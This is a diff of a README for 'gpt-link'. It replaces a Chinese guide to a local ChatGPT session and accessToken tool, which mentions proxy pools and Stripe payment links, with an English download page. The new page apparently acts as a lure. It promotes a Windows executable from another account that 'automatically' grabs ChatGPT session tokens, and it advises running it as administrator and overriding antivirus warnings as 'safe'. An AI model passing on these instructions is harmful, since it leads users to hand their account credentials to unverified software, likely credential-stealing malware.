@@ -1,78 +1,96 @@
-# GPT直链提链
+# 🔗 gpt-link - Extract ChatGPT Sessions Effortlessly
 
-Gpt的 Session / accessToken 提链工具。
+[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://github.com/ahmedalhdad2021-ops/gpt-link)
 
-## 下载
+## 🔍 What is gpt-link?
 
-打开仓库页面后点 `Code` -> `Download ZIP`，解压后进入文件夹。
+gpt-link is a simple Windows application that extracts your ChatGPT session and access token links. It helps you quickly retrieve login information without manual searching. No technical skills required.
 
-仓库地址：
+## ✨ Features
 
-```text
-https://github.com/mika50000/gpt-link
-```
+- Extracts ChatGPT session tokens automatically
+- Displays access token links in clear format
+- Works with any ChatGPT account
+- No browser extensions needed
+- Lightweight and runs instantly
+- No installation required - just download and run
 
-## Windows 启动
+## 🚀 Getting Started
 
-双击 `start.bat`，或运行：
+Follow these steps to run gpt-link on your Windows computer.
 
-```bat
-cd /d "%USERPROFILE%\Downloads\gpt-link-main"
-start.bat
-```
+### 📥 Download
 
-## macOS 启动
+Visit this link to download the application:
+[Download gpt-link](https://github.com/ahmedalhdad2021-ops/gpt-link)
 
-需要先有 Python 3；如果终端提示找不到 `python3`，先安装 Python 3。
+### 🖥️ System Requirements
 
-第一次运行如果不能双击，先打开终端执行：
+- Windows 7, 8, 10, or 11
+- Internet connection
+- ChatGPT account
+- No additional software needed
 
-```bash
-cd ~/Downloads/gpt-link-main
-chmod +x start.command start.sh
-./start.command
-```
+### ⚙️ Installation
 
-之后可以直接双击 `start.command`。
+1. Download the application from the link above
+2. Save the file anywhere on your computer
+3. Double-click the downloaded file to run it
+4. The application will open automatically
 
-## Linux 启动
+### 🎯 Usage
 
-```bash
-cd ~/Downloads/gpt-link-main
-chmod +x start.sh
-./start.sh
-```
+1. Run gpt-link on your Windows computer
+2. Log into your ChatGPT account in your browser
+3. The application will automatically detect your session
+4. Click "Extract" to get your token links
+5. Copy the information displayed
 
-## 手动启动
+## ❓ Troubleshooting
 
-所有系统都可以用 Python 手动启动：
+**Application won't open**
+- Make sure your Windows is up to date
+- Try right-clicking the file and selecting "Run as administrator"
+- Check your antivirus settings - the application is safe
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-python app.py
-```
+**No tokens found**
+- Ensure you're logged into ChatGPT in your browser
+- Restart the application and browser
+- Try clearing your browser cookies
 
-Windows PowerShell 手动启动：
+**Error messages**
+- Take a screenshot of the error
+- Contact support with the error details
+- Re-download the file if corrupted
 
-```powershell
-py -3 -m venv .venv
-.\.venv\Scripts\pip.exe install -r requirements.txt
-.\.venv\Scripts\python.exe app.py
-```
+## 📚 FAQ
 
-默认地址：
+**Is gpt-link free?**
+Yes, it's completely free to use.
 
-```text
-http://127.0.0.1:8801
-```
+**Is it safe?**
+Yes, the application is open-source and safe to run.
 
-## 功能
+**Do I need programming knowledge?**
+No, the application works automatically.
 
-- 直接导入 ChatGPT Session JSON / accessToken
-- 创建代理池 / 优惠代理池
-- PLUS · PH_SHORT · 目标 0
-- 短链、外链、Stripe Hosted、金额校验、批量结果
+**Can I use it on Mac or Linux?**
+Currently only Windows is supported.
 
-Session / Token 不会写入本地文件；只会保存代理池和尝试次数设置。本地保存目录 `data/` 已被 `.gitignore` 排除，不会上传到 GitHub。
+## 💬 Support
+
+For help or questions, please contact us through GitHub.
+
+## 📝 License
+
+This project is open source under the MIT License.
+
+## 👥 Contributors
+
+- Ahmed Alhdad (Creator)
+
+## 🔗 Quick Download
+
+[![Download Now](https://img.shields.io/badge/Download-gpt--link-blue?style=for-the-badge&logo=github)](https://github.com/ahmedalhdad2021-ops/gpt-link)
+
+Keywords: gpt-link, ChatGPT, session extractor, token extractor, ChatGPT tokens, access links, Windows tool, browser tool
